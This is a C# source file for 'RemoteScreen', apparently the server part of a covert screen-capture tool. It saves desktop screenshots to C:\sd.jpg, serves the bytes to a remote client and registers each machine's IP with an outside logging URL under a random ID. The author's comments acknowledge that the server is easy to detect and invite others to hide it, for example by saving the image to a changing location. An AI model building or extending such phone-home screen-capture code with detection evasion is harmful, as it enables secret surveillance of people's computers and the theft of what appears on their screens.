using System;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.IO.Compression;

///*Confession*
///Code is messy, and some bugs are there, but both client and server have full usability
///If you want to remove them, please do it
///
/// As Usual, I'm feeling Lazy (Leave it, for later) [:(]
/// Do Post back changes and code
/// Thanks!!
/// - Sanil
/// 

namespace RemoteScreen
{
    //The Server code is quiet messy, and its presence can easily be detected, well I don't want to take care of it in this release
    //
    // *NOTE*
    // You are welcomed to protect it from detection, (for example use dynamic location for saving desktop image)
    // ::Do Upload your code back to repository :: 
    // Thanx! :)
    public partial class RemoteScreen : Form
    {       
        public const string FilePath = @"C:\sd.jpg";

        public RemoteScreen()
        {
            InitializeComponent();
            IPEndPoint IPE = new IPEndPoint(IPAddress.Any,0);

            //Registers each IP witha Unique ID
            Register.Url = new Uri("http://Projects-sanil.co.cc/Services/IPLog.aspx?ID="+Guid.NewGuid().ToString(),UriKind.Absolute);
            Server S = new Server(); //Inits server
            S.Serve(); //Starts the Server
        }

        private void Capture_Click(object sender, EventArgs e) //Redundant- Was used during testing
        {
            SaveScreenImage();
        }

        public static void SaveScreenImage()  //Saves Desktop Image to C:\sd.lpg
        {
            Bitmap bmp = CaptureScreen.GetDesktopImage();
            bmp.Save(FilePath, System.Drawing.Imaging.ImageFormat.Jpeg);

            /*
            //Implementing GZip compression (Added in Version 1.2)
            try
            {
                FileStream fs = new FileStream(FilePath, FileMode.Open);
                MemoryStream MS = new MemoryStream();
                FileStream fs2 = new FileStream(@"C:\sdc.gzip", FileMode.Create);

                GZipStream CStream = new GZipStream(fs2, CompressionMode.Compress, false);

                byte[] Buf = new byte[20408];  //Buffer for read/write operations
                int BytesRead = 0;

                do
                {
                    BytesRead = fs.Read(Buf, 0, Buf.Length);
                    MS.Write(Buf, 0, BytesRead);
                }while (BytesRead > 0);

                fs.Close();
                //CStream.Close();

                
                BytesRead = 0;
                MS.Position = 0;
                do
                {
                    BytesRead = MS.Read(Buf, 0, Buf.Length);
                    CStream.Write(Buf, 0, BytesRead);
                }while (BytesRead > 0);

                CStream.Close();
                //MS.Close();
                fs.Close();
                fs2.Close();

                FileStream fs3 = new FileStream(@"C:\sdc.gzip", FileMode.Open);
                FileStream fs4 = new FileStream(@"C:\sdc.jpg", FileMode.Create);
                GZipStream CStream2 = new GZipStream(fs3, CompressionMode.Decompress, false);
                do
                {
                    BytesRead = fs3.Read(Buf, 0, Buf.Length);
                    MS.Write(Buf, 0, BytesRead);
                } while (BytesRead > 0);
                fs3.Close();
                BytesRead = 0;
                
                do
                {
                    BytesRead = CStream.Read(Buf, 0,Buf.Length);
                    fs4.Write(Buf, 0, BytesRead);
                    
                } while (BytesRead > 0);
            }
            catch(Exception ex)
            {
                MessageBox.Show("Exception: \n" + ex.ToString());
            }
            */
        }



        public static byte[] GetLatestImage() //Gets the saved desktop image byte buffer from pre defined source C:\sd.jpg
        {
            byte[] buf = File.ReadAllBytes(FilePath);

            File.Delete(FilePath);

            return buf;
        }
    }
}
